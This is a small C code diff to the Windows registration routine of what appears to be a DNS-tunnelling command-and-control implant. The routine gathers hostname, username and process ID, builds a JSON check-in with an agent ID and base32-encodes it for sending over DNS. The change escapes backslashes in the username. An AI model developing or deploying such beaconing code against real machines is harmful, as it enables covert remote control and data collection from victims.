@@ -200,6 +200,11 @@ int transport_dns_register(void) {
     ULONG usz=sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
         GetUserNameA(username, (DWORD*)&usz);
+    char username_j[512]={0};
+    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
+        if (username[_i]=='\\') username_j[_j++]='\\';
+        username_j[_j++]=username[_i];
+    }
     unsigned long pid = (unsigned long)GetCurrentProcessId();
 
     // Compute FNV-1a agent ID from hostname+pid
@@ -213,7 +218,7 @@ int transport_dns_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"aes_key\":\"\",\"language\":\"c\"}",
-        hostname, username, pid);
+        hostname, username_j, pid);
 
     char *encoded = dns_b32_encode((const uint8_t*)body, strlen(body));
     if (!encoded) return 0;
